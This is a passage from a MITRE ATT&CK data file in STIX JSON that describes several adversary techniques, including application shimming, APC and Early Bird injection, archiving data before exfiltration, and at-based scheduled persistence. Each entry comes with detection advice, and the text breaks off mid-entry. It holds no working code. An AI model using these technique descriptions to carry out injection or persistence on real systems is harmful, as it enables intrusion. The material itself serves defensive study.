    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1138\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1138\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.\",\"source_name\":\"Black Hat 2015 App Shim\",\"url\":\"https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf\"}],\"id\":\"attack-pattern--7c93aa74-4bc0-4a9e-90ea-f25f86301566\",\"modified\":\"2020-01-24T15:00:47.185Z\",\"name\":\"Application Shimming\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:56:24.231Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017)\\n\\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \\n\\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\\n\\n* <code>%WINDIR%\\\\AppPatch\\\\sysmain.sdb</code> and\\n* <code>hklm\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\appcompatflags\\\\installedsdb</code>\\n\\nCustom databases are stored in:\\n\\n* <code>%WINDIR%\\\\AppPatch\\\\custom & %WINDIR%\\\\AppPatch\\\\AppPatch64\\\\Custom</code> and\\n* <code>hklm\\\\software\\\\microsoft\\\\windows nt\\\\currentversion\\\\appcompatflags\\\\custom</code>\\n\\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\\n\\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.\",\"external_references\":[{\"external_id\":\"T1546.011\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/011\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"},{\"description\":\"Ballenthin, W., Tomczak, J.. (2015). The Real Shim Shary. Retrieved May 4, 2020.\",\"source_name\":\"FireEye Application Shimming\",\"url\":\"http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf\"},{\"description\":\"Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.\",\"source_name\":\"Black Hat 2015 App Shim\",\"url\":\"https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf\"}],\"id\":\"attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-04T19:05:30.140Z\",\"name\":\"Application Shimming\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):\\n\\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\\n* Shim-Detector-Lite - detects installation of custom shim databases\\n* Shim-Guard - monitors registry for any shim installations\\n* ShimScanner - forensic tool to find active shims in memory\\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\\n\\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:24.512Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\",\"external_references\":[{\"external_id\":\"T1010\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1010\"}],\"id\":\"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T15:44:27.068Z\",\"name\":\"Application Window Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-02-20T15:37:27.052Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.\",\"external_references\":[{\"external_id\":\"T1499.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1499/004\"},{\"description\":\"Cid, D.. (2015, August 2). BIND9 – Denial of Service Exploit in the Wild. Retrieved April 26, 2019.\",\"source_name\":\"Sucuri BIND9 August 2015\",\"url\":\"https://blog.sucuri.net/2015/08/bind9-denial-of-service-exploit-in-the-wild.html\"}],\"id\":\"attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T02:07:27.508Z\",\"name\":\"Application or System Exploitation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Network device logs\",\"Network intrusion detection system\",\"Web application firewall logs\",\"Web logs\",\"SSL/TLS inspection\"],\"x_mitre_detection\":\"Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T20:53:45.725Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\\n\\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.\",\"external_references\":[{\"external_id\":\"T1560\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1560\"},{\"description\":\"Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.\",\"source_name\":\"Wikipedia File Header Signatures\",\"url\":\"https://en.wikipedia.org/wiki/List_of_file_signatures\"}],\"id\":\"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-29T18:27:31.040Z\",\"name\":\"Archive Collected Data\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"File monitoring\",\"Binary file metadata\"],\"x_mitre_detection\":\"Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\\n\\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\\n\\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T21:09:55.995Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)\",\"external_references\":[{\"external_id\":\"T1560.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1560/003\"},{\"description\":\"ESET. (2016, October). En Route with Sednit - Part 2: Observing the Comings and Goings. Retrieved November 21, 2016.\",\"source_name\":\"ESET Sednit Part 2\",\"url\":\"http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf\"}],\"id\":\"attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-25T22:48:14.605Z\",\"name\":\"Archive via Custom Method\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_detection\":\"Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T21:08:52.529Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\\n\\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.\",\"external_references\":[{\"external_id\":\"T1560.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1560/002\"},{\"description\":\"mkz. (2020). rarfile 3.1. Retrieved February 20, 2020.\",\"source_name\":\"PyPI RAR\",\"url\":\"https://pypi.org/project/rarfile/\"},{\"description\":\"D. Baron, T. Klausner. (2020). libzip. Retrieved February 20, 2020.\",\"source_name\":\"libzip\",\"url\":\"https://libzip.org/\"},{\"description\":\"madler. (2017). zlib. Retrieved February 20, 2020.\",\"source_name\":\"Zlib Github\",\"url\":\"https://github.com/madler/zlib\"},{\"description\":\"Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.\",\"source_name\":\"Wikipedia File Header Signatures\",\"url\":\"https://en.wikipedia.org/wiki/List_of_file_signatures\"}],\"id\":\"attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-29T18:27:30.891Z\",\"name\":\"Archive via Library\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\\n\\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-20T21:01:25.428Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip(Citation: 7zip Homepage), WinRAR(Citation: WinRAR Homepage), and WinZip(Citation: WinZip Homepage). Most utilities include functionality to encrypt and/or compress data.\\n\\nSome 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.\",\"external_references\":[{\"external_id\":\"T1560.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1560/001\"},{\"description\":\"I. Pavlov. (2019). 7-Zip. Retrieved February 20, 2020.\",\"source_name\":\"7zip Homepage\",\"url\":\"https://www.7-zip.org/\"},{\"description\":\"A. Roshal. (2020). RARLAB. Retrieved February 20, 2020.\",\"source_name\":\"WinRAR Homepage\",\"url\":\"https://www.rarlab.com/\"},{\"description\":\"Corel Corporation. (2020). WinZip. Retrieved February 20, 2020.\",\"source_name\":\"WinZip Homepage\",\"url\":\"https://www.winzip.com/win/en/\"},{\"description\":\"Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.\",\"source_name\":\"Wikipedia File Header Signatures\",\"url\":\"https://en.wikipedia.org/wiki/List_of_file_signatures\"}],\"id\":\"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-25T21:54:37.374Z\",\"name\":\"Archive via Utility\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process command-line parameters\",\"File monitoring\",\"Binary file metadata\"],\"x_mitre_detection\":\"Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\\n\\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-16T15:48:33.882Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\\n\\nFor efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).\",\"external_references\":[{\"external_id\":\"T1573.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1573/002\"},{\"description\":\"Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.\",\"source_name\":\"SANS Decrypting SSL\",\"url\":\"http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840\"},{\"description\":\"Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.\",\"source_name\":\"SEI SSL Inspection Risks\",\"url\":\"https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-30T00:37:16.593Z\",\"name\":\"Asymmetric Cryptography\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"Process use of network\",\"Malware reverse engineering\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\\n\\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-14T01:29:43.786Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \\n\\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process\'s thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \\n\\nA variation of APC injection, dubbed \\\"Early Bird injection\\\", involves creating a suspended process in which malicious code can be written and executed before the process\' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\\n\\nRunning code in the context of another process may allow access to the process\'s memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. \",\"external_references\":[{\"external_id\":\"T1055.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1055/004\"},{\"description\":\"Microsoft. (n.d.). Asynchronous Procedure Calls. Retrieved December 8, 2017.\",\"source_name\":\"Microsoft APC\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx\"},{\"description\":\"Gavriel, H. & Erbesfeld, B. (2018, April 11). New ‘Early Bird’ Code Injection Technique Discovered. Retrieved May 24, 2018.\",\"source_name\":\"CyberBit Early Bird Apr 2018\",\"url\":\"https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/\"},{\"description\":\"Liberman, T. (2016, October 27). ATOMBOMBING: BRAND NEW CODE INJECTION FOR WINDOWS. Retrieved December 8, 2017.\",\"source_name\":\"ENSIL AtomBombing Oct 2016\",\"url\":\"https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows\"},{\"description\":\"Microsoft. (n.d.). About Atom Tables. Retrieved December 8, 2017.\",\"source_name\":\"Microsoft Atom Table\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx\"},{\"description\":\"Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.\",\"source_name\":\"Endgame Process Injection July 2017\",\"url\":\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\"}],\"id\":\"attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T22:17:05.394Z\",\"name\":\"Asynchronous Procedure Call\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"API monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\\n\\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-12-03T12:59:36.749Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)\\n\\nAn adversary may use [at](https://attack.mitre.org/software/S0110) in Linux environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\",\"external_references\":[{\"external_id\":\"T1053.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1053/001\"},{\"description\":\"Koromicha. (2019, September 7). Scheduling tasks using at command in Linux. Retrieved December 3, 2019.\",\"source_name\":\"Kifarunix - Task Scheduling in Linux\",\"url\":\"https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/\"}],\"id\":\"attack-pattern--6636bc83-0611-45a6-b74f-1f3daf635b8e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-23T22:35:13.112Z\",\"name\":\"At (Linux)\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \\n\\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-11-27T13:52:45.853Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse the <code>at.exe</code> utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. \\n\\nAn adversary may use <code>at.exe</code> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\\n\\nNote: The <code>at.exe</code> command line utility has been deprecated in current versions of Windows in favor of <code>schtasks</code>.\",\"external_references\":[{\"external_id\":\"T1053.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1053/002\"},{\"description\":\"Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.\",\"source_name\":\"Twitter Leoloobeek Scheduled Task\",\"url\":\"https://twitter.com/leoloobeek/status/939248813465853953\"},{\"description\":\"Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.\",\"source_name\":\"TechNet Forum Scheduled Task Operational Setting\",\"url\":\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\"},{\"description\":\"Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.\",\"source_name\":\"TechNet Scheduled Task Events\",\"url\":\"https://technet.microsoft.com/library/dd315590.aspx\"},{\"description\":\"Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.\",\"source_name\":\"Microsoft Scheduled Task Events Win10\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-24T13:43:40.776Z\",\"name\":\"At (Windows)\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\\\System32\\\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\\n\\nConfigure event logging for scheduled task creation and changes by enabling the \\\"Microsoft-Windows-TaskScheduler/Operational\\\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\\n\\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\\n* Event ID 141 on Windows 